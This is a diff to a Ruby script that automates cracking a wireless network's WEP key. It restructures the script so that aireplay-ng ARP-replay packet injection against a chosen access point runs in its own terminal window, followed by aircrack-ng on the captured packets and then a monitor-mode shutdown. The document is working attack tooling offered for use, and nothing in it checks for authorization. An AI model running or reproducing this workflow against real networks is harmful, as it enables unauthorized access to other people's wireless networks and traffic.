@@ -167,17 +167,19 @@ def authenticate_with_ap(apinfo, monitor_interface)
   return ask_continue(monitor_interface)
 end
 
-def open_crack_window(apinfo, monitor_interface)
-  puts "Opening aircrack-ng in separate window"
-  cmd = "aircrack-ng -b #{apinfo.bssid} wcrb*.cap"
+def open_inject_window(apinfo, monitor_interface)
+  puts "Opening packet injection in separate window"
+  cmd = "aireplay-ng -3 -b #{apinfo.bssid} #{monitor_interface}"
   cmd = "gnome-terminal --geometry 100x25-0-0 --execute #{cmd} &"
   puts "=> #{cmd}"
   system(cmd)
 end
 
-def inject_packets(apinfo, monitor_interface)
-  puts "Starting packet injection... good luck!"
-  cmd = "aireplay-ng -3 -b #{apinfo.bssid} #{monitor_interface}"
+def crack_key(apinfo)
+  puts "Press [enter] to begin cracking attempt"
+  print "> "
+  gets
+  cmd = "aircrack-ng -b #{apinfo.bssid} wcrb*.cap"
   puts "=> #{cmd}"
   system(cmd)
 end
@@ -193,8 +195,9 @@ def main
   return unless test_injection(apinfo, monitor_interface)
   open_capture_window(apinfo, monitor_interface)
   return unless authenticate_with_ap(apinfo, monitor_interface)
-  open_crack_window(apinfo, monitor_interface)
-  inject_packets(apinfo, monitor_interface)
+  open_inject_window(apinfo, monitor_interface)
+  crack_key(apinfo)
+  stop_monitor_mode(monitor_interface)
 end
 
 main
